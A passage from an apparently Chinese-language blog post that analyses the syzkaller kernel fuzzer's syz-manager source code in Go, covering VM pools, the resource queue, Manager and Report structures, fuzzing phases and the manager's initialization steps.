cfg.CPU)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Mem &lt; <span class="hljs-number">128</span> || cfg.Mem &gt; <span class="hljs-number">1048576</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;bad qemu mem: %v, want [128-1048576]&quot;</span>, cfg.Mem)<br>&#125;<br>cfg.Kernel = osutil.Abs(cfg.Kernel)<br>cfg.Initrd = osutil.Abs(cfg.Initrd)<br><br>output, err := osutil.RunCmd(time.Minute, <span class="hljs-string">&quot;&quot;</span>, cfg.Qemu, <span class="hljs-string">&quot;--version&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>version := <span class="hljs-type">string</span>(bytes.Split(output, []<span class="hljs-type">byte</span>&#123;<span class="hljs-string">&#x27;\n&#x27;</span>&#125;)[<span class="hljs-number">0</span>])<br><br>pool := &amp;Pool&#123;<br>env:        env,<br>cfg:        cfg,<br>version:    version,<br>target:     targets.Get(env.OS, env.Arch),<br>archConfig: archConfig,<br>&#125;<br><span class="hljs-keyword">return</span> pool, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-ResourcePool：VM-资源池队列"><a href="#5-ResourcePool：VM-资源池队列" class="headerlink" title="5. ResourcePool：VM 资源池队列"></a>5. ResourcePool：VM 资源池队列</h3><p>Guest VM 的资源调配主要是通过<code>ResourcePool</code> 这一结构来完成的，这实际上是一个 <strong>存放空闲 VM の idx 的单向队列，决定了 VM 的调度顺序</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ResourcePool <span class="hljs-keyword">struct</span> &#123;<br>ids   []<span class="hljs-type">int</span><br>mu    sync.RWMutex<br>Freed <span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要定义了这些方法来操纵资源池队列：</p><ul><li><code>Put()</code> ：向队列末尾添加空闲 VM の idx</li><li><code>Len()</code> ：获取队列长度</li><li><code>Take()</code>：从队列首部取出 <code>cnt</code> 个成员</li><li><code>TakeOne()</code> ：从队列首部取出单个成员</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Put(ids ...<span class="hljs-type">int</span>) &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">defer</span> pool.mu.Unlock()<br>pool.ids = <span class="hljs-built_in">append</span>(pool.ids, ids...)<br><span class="hljs-comment">// Notify the listener.</span><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> pool.Freed &lt;- <span class="hljs-literal">true</span>:<br><span class="hljs-keyword">default</span>:<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Len() <span class="hljs-type">int</span> &#123;<br>pool.mu.RLock()<br><span class="hljs-keyword">defer</span> pool.mu.RUnlock()<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(pool.ids)<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Take(cnt <span class="hljs-type">int</span>) []<span class="hljs-type">int</span> &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">defer</span> pool.mu.Unlock()<br>totalItems := <span class="hljs-built_in">len</span>(pool.ids)<br><span class="hljs-keyword">if</span> totalItems &lt; cnt &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>ret := <span class="hljs-built_in">append</span>([]<span class="hljs-type">int</span>&#123;&#125;, pool.ids[totalItems-cnt:]...)<br>pool.ids = pool.ids[:totalItems-cnt]<br><span class="hljs-keyword">return</span> ret<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> TakeOne() *<span class="hljs-type">int</span> &#123;<br>ret := pool.Take(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> ret == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span> &amp;ret[<span class="hljs-number">0</span>]<br>&#125;<br></code></pre></td></tr></table></figure><p>同时有一个 <code>SequentialResourcePool()</code> 函数用以初始化资源池：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SequentialResourcePool</span><span class="hljs-params">(count <span class="hljs-type">int</span>, delay time.Duration)</span></span> *ResourcePool &#123;<br>ret := &amp;ResourcePool&#123;Freed: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-number">1</span>)&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; count; i++ &#123;<br>ret.Put(i)<br>time.Sleep(delay)<br>&#125;<br>&#125;()<br><span class="hljs-keyword">return</span> ret<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="全局管控相关"><a href="#全局管控相关" class="headerlink" title="全局管控相关"></a>全局管控相关</h2><h3 id="1-Manager：基本信息"><a href="#1-Manager：基本信息" class="headerlink" title="1. Manager：基本信息"></a>1. Manager：基本信息</h3><p><code>Manager</code> 结构体用于<strong>表示一个 syz-manager 的基本信息</strong>，定义于 <code>syz-manager/manager.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Manager <span class="hljs-keyword">struct</span> &#123;<br>cfg            *mgrconfig.Config<br>vmPool         *vm.Pool<br>target         *prog.Target<br>sysTarget      *targets.Target<br>reporter       *report.Reporter<br>crashdir       <span class="hljs-type">string</span><br>serv           *RPCServer<br>corpusDB       *db.DB<br>startTime      time.Time<br>firstConnect   time.Time<br>fuzzingTime    time.Duration<br>stats          *Stats<br>crashTypes     <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>vmStop         <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br>checkResult    *rpctype.CheckArgs<br>fresh          <span class="hljs-type">bool</span><br>numFuzzing     <span class="hljs-type">uint32</span><br>numReproducing <span class="hljs-type">uint32</span><br><br>dash *dashapi.Dashboard<br><br>mu                    sync.Mutex<br>phase                 <span class="hljs-type">int</span><br>targetEnabledSyscalls <span class="hljs-keyword">map</span>[*prog.Syscall]<span class="hljs-type">bool</span><br><br>candidates       []rpctype.Candidate <span class="hljs-comment">// untriaged inputs from corpus and hub</span><br>disabledHashes   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;<br>corpus           <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]CorpusItem<br>seeds            [][]<span class="hljs-type">byte</span><br>newRepros        [][]<span class="hljs-type">byte</span><br>lastMinCorpus    <span class="hljs-type">int</span><br>memoryLeakFrames <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>dataRaceFrames   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>saturatedCalls   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br>needMoreRepros <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br>hubReproQueue  <span class="hljs-keyword">chan</span> *Crash<br>reproRequest   <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br><span class="hljs-comment">// For checking that files that we are using are not changing under us.</span><br><span class="hljs-comment">// Maps file name to modification time.</span><br>usedFiles <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]time.Time<br><br>modules            []host.KernelModule<br>coverFilter        <span class="hljs-keyword">map</span>[<span class="hljs-type">uint32</span>]<span class="hljs-type">uint32</span><br>coverFilterBitmap  []<span class="hljs-type">byte</span><br>modulesInitialized <span class="hljs-type">bool</span><br><br>assetStorage *asset.Storage<br>&#125;<br></code></pre></td></tr></table></figure><p>这里只说明比较关键的几个字段：</p><ul><li><code>cfg</code>：基本设置信息，对应存放在一个 json 文件中</li><li><code>vmPool</code> ：所用的 VM Pool</li><li><code>reporter</code>：用以报告 crash</li><li><code>serv</code> ：RPC Server，用以与 Guest 间通信</li><li><code>corpusDB</code>：存放语料的数据库</li><li><code>targetEnabledSyscalls</code>：测试用例所允许使用的系统调用</li><li><code>candidates</code>：待执行测试用例</li><li><code>corpus</code>：语料库</li><li><code>seeds</code>：用来对语料库变异的种子</li></ul><h3 id="2-fuzzing-phase"><a href="#2-fuzzing-phase" class="headerlink" title="2. fuzzing phase"></a>2. fuzzing phase</h3><p><code>syz-manager</code> 中将 fuzzing 流程分为如下的不同阶段：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br><span class="hljs-comment">// 刚刚开始，啥都没做.</span><br>phaseInit = <span class="hljs-literal">iota</span><br><span class="hljs-comment">// 加载了语料库且检查了机器.</span><br>phaseLoadedCorpus<br><span class="hljs-comment">// 从语料库中分类了所有输入.</span><br><span class="hljs-comment">// 这是我们开始查询 hub 与最小化连续语料库的时候.</span><br>phaseTriagedCorpus<br><span class="hljs-comment">// 第一个请求发送到了 hub.</span><br>phaseQueriedHub<br><span class="hljs-comment">// 分类所有来自 hub 的新输入.</span><br><span class="hljs-comment">// 这是我们开始复现 crashes 的时候.</span><br>phaseTriagedHub<br>)<br></code></pre></td></tr></table></figure><h2 id="Fuzzing-结果相关"><a href="#Fuzzing-结果相关" class="headerlink" title="Fuzzing 结果相关"></a>Fuzzing 结果相关</h2><h3 id="1-Crash：记录-crash-信息"><a href="#1-Crash：记录-crash-信息" class="headerlink" title="1. Crash：记录 crash 信息"></a>1. Crash：记录 crash 信息</h3><p><code>manager.go</code> 中定义了<code>Crash</code> 结构体用以记录产生 crash 的 VM、机器信息等，<strong>真正的 crash 信息主要存放在一个 <code>Report</code> 结构体中</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Crash <span class="hljs-keyword">struct</span> &#123;<br>vmIndex <span class="hljs-type">int</span><br>hub     <span class="hljs-type">bool</span> <span class="hljs-comment">// this crash was created based on a repro from hub</span><br>*report.Report<br>machineInfo []<span class="hljs-type">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-Report：单次执行结果报告"><a href="#2-Report：单次执行结果报告" class="headerlink" title="2. Report：单次执行结果报告"></a>2. Report：单次执行结果报告</h3><p><code>pkg/report/rteport.go</code> 中的 <code>Report</code> 结构体用以表示单次执行的结果，包括是否产生了 crash、Oops 的信息等等：</p><ul><li><p><code>Title</code>：<strong>Oops 的第一行文本，用来标识特定类型的 crash</strong></p><blockquote><p>例如 <code>BUG: unable to handle page fault for address: ffffffff81001619</code> 这样的</p></blockquote></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Report <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// Title contains a representative description of the first oops.</span><br>Title <span class="hljs-type">string</span><br><span class="hljs-comment">// Alternative titles, used for better deduplication.</span><br><span class="hljs-comment">// If two crashes have a non-empty intersection of Title/AltTitles, they are considered the same bug.</span><br>AltTitles []<span class="hljs-type">string</span><br><span class="hljs-comment">// Bug type (e.g. hang, memory leak, etc).</span><br>Type Type<br><span class="hljs-comment">// The indicative function name.</span><br>Frame <span class="hljs-type">string</span><br><span class="hljs-comment">// Report contains whole oops text.</span><br>Report []<span class="hljs-type">byte</span><br><span class="hljs-comment">// Output contains whole raw console output as passed to Reporter.Parse.</span><br>Output []<span class="hljs-type">byte</span><br><span class="hljs-comment">// StartPos/EndPos denote region of output with oops message(s).</span><br>StartPos <span class="hljs-type">int</span><br>EndPos   <span class="hljs-type">int</span><br><span class="hljs-comment">// SkipPos is position in output where parsing for the next report should start.</span><br>SkipPos <span class="hljs-type">int</span><br><span class="hljs-comment">// Suppressed indicates whether the report should not be reported to user.</span><br>Suppressed <span class="hljs-type">bool</span><br><span class="hljs-comment">// Corrupted indicates whether the report is truncated of corrupted in some other way.</span><br>Corrupted <span class="hljs-type">bool</span><br><span class="hljs-comment">// CorruptedReason contains reason why the report is marked as corrupted.</span><br>CorruptedReason <span class="hljs-type">string</span><br><span class="hljs-comment">// Recipients is a list of RecipientInfo with Email, Display Name, and type.</span><br>Recipients vcs.Recipients<br><span class="hljs-comment">// GuiltyFile is the source file that we think is to blame for the crash  (filled in by Symbolize).</span><br>GuiltyFile <span class="hljs-type">string</span><br><span class="hljs-comment">// reportPrefixLen is length of additional prefix lines that we added before actual crash report.</span><br>reportPrefixLen <span class="hljs-type">int</span><br><span class="hljs-comment">// symbolized is set if the report is symbolized.</span><br>symbolized <span class="hljs-type">bool</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x02-main-：加载配置文件，启动-manager"><a href="#0x02-main-：加载配置文件，启动-manager" class="headerlink" title="0x02. main()：加载配置文件，启动 manager"></a>0x02. main()：加载配置文件，启动 manager</h1><p><code>syz-manager</code> 的 <code>main()</code> 函数其实比较简单，主要就是载入配置文件信息并调用 <code>RunManager()</code> ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> prog.GitRevision == <span class="hljs-string">&quot;&quot;</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;bad syz-manager build: build with make, run bin/syz-manager&quot;</span>)<br>&#125;<br>flag.Parse()<br>log.EnableLogCaching(<span class="hljs-number">1000</span>, <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">20</span>)<br>cfg, err := mgrconfig.LoadFile(*flagConfig)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br>RunManager(cfg)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><del>👴寻思好像没什么好说的</del></p></blockquote><h1 id="0x03-RunManager-：进行初始化工作"><a href="#0x03-RunManager-：进行初始化工作" class="headerlink" title="0x03. RunManager()：进行初始化工作"></a>0x03. RunManager()：进行初始化工作</h1><h3 id="Step-1-初始化-VM-Pool"><a href="#Step-1-初始化-VM-Pool" class="headerlink" title="Step 1. 初始化 VM Pool"></a>Step 1. 初始化 VM Pool</h3><p>首先是初始化 VM Pool，这里调用了 <code>vm/vm.go</code> 中的 <code>Create()</code> 来完成 VM pool 的创建</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> vmPool *vm.Pool<br>   <span class="hljs-comment">// &quot;none&quot; 类型对于调试/开发而言是一种特殊情况，manager 并不会启动任何 VM，</span><br>   <span class="hljs-comment">// 但相应的是你应当手动启动 VM 并在此启动 syz-fuzzer.</span><br><span class="hljs-keyword">if</span> cfg.Type != <span class="hljs-string">&quot;none&quot;</span> &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>vmPool, err = vm.Create(cfg, *flagDebug)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数主要就是获取 VM 类型、封装一个 Env 结构体、调用对应类型 VM Pool 的构造函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Create 创建一个可用于创建独立 VMs 的 VM pool.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Create</span><span class="hljs-params">(cfg *mgrconfig.Config, debug <span class="hljs-type">bool</span>)</span></span> (*Pool, <span class="hljs-type">error</span>) &#123;<br>typ, ok := vmimpl.Types[cfg.Type]<br><span class="hljs-keyword">if</span> !ok &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;unknown instance type &#x27;%v&#x27;&quot;</span>, cfg.Type)<br>&#125;<br>env := &amp;vmimpl.Env&#123;<br>Name:      cfg.Name,<br>OS:        cfg.TargetOS,<br>Arch:      cfg.TargetVMArch,<br>Workdir:   cfg.Workdir,<br>Image:     cfg.Image,<br>SSHKey:    cfg.SSHKey,<br>SSHUser:   cfg.SSHUser,<br>Timeouts:  cfg.Timeouts,<br>Debug:     debug,<br>Config:    cfg.VM,<br>KernelSrc: cfg.KernelSrc,<br>&#125;<br>impl, err := typ.Ctor(env)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> &amp;Pool&#123;<br>impl:     impl,<br>workdir:  env.Workdir,<br>template: cfg.WorkdirTemplate,<br>timeouts: cfg.Timeouts,<br>&#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-2-初始化-Manager，载入语料库，建立通信服务器"><a href="#Step-2-初始化-Manager，载入语料库，建立通信服务器" class="headerlink" title="Step 2. 初始化 Manager，载入语料库，建立通信服务器"></a>Step 2. 初始化 Manager，载入语料库，建立通信服务器</h3><p>随后会创建用于存储 crash 的文件夹与一个新的 Reporter 实例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">crashdir := filepath.Join(cfg.Workdir, <span class="hljs-string">&quot;crashes&quot;</span>)<br>osutil.MkdirAll(crashdir)<br><br>reporter, err := report.NewReporter(cfg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来创建一个基本的 Manager 实例，然后是四步走：</p><ul><li><p><code>preloadCorpus()</code>：检查 <code>corpus.db</code> 文件是否存在（若不存在则创建）并载入 <code>sys/要fuzz的OS/test</code> 目录下的测试用模板</p><blockquote><p>语料库载入的模板本身类似于 syzlang 文件，例如 <code>sys/linux/pipe</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">pipe2(&amp;(0x7f0000000000)=&#123;&lt;r0=&gt;0x0, &lt;r1=&gt;0x0&#125;, 0x0)<br>close(r0)<br>close(r1)<br></code></pre></td></tr></table></figure></blockquote></li><li><p><code>initStats()</code>：注册一个 prometheus 监视器（一个开源的监视&amp;预警工具包）</p></li><li><p><code>initHTTP()</code>：创建一个 HTTP 服务器并注册一系列的目录（用以供使用者访问）</p></li><li><p><code>collectUsedFiles()</code>：检查所需文件是否存在</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go">mgr := &amp;Manager&#123;<br>cfg:              cfg,<br>vmPool:           vmPool,<br>target:           cfg.Target,<br>sysTarget:        cfg.SysTarget,<br>reporter:         reporter,<br>crashdir:         crashdir,<br>startTime:        time.Now(),<br>stats:            &amp;Stats&#123;haveHub: cfg.HubClient != <span class="hljs-string">&quot;&quot;</span>&#125;,<br>crashTypes:       <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>corpus:           <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]CorpusItem),<br>disabledHashes:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>memoryLeakFrames: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>dataRaceFrames:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>fresh:            <span class="hljs-literal">true</span>,<br>vmStop:           <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>),<br>hubReproQueue:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *Crash, <span class="hljs-number">10</span>),<br>needMoreRepros:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>),<br>reproRequest:     <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>usedFiles:        <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]time.Time),<br>saturatedCalls:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>&#125;<br><br>mgr.preloadCorpus()<br>mgr.initStats() <span class="hljs-comment">// 初始化 prometheus 变量.</span><br>mgr.initHTTP()  <span class="hljs-comment">// 创建 HTTP 服务.</span><br>mgr.collectUsedFiles()<br></code></pre></td></tr></table></figure><p>之后创建一个 RPC Server，用以在 Host 与 Guest VMs 之间进行通信：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Create 为 fuzzer 创建 PRC 服务器.</span><br>mgr.serv, err = startRPCServer(mgr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create rpc server: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-3-初始化-dashboard-相关"><a href="#Step-3-初始化-dashboard-相关" class="headerlink" title="Step 3.  初始化 dashboard 相关"></a><em>Step 3.  初始化 dashboard 相关</em></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> cfg.DashboardAddr != <span class="hljs-string">&quot;&quot;</span> &#123;<br>mgr.dash, err = dashapi.New(cfg.DashboardClient, cfg.DashboardAddr, cfg.DashboardKey)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create dashapi connection: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> !cfg.AssetStorage.IsEmpty() &#123;<br>mgr.assetStorage, err = asset.StorageFromConfig(cfg.AssetStorage, mgr.dash)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to init asset storage: %v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-4-创建【日志输出】协程"><a href="#Step-4-创建【日志输出】协程" class="headerlink" title="Step 4. 创建【日志输出】协程"></a>Step 4. 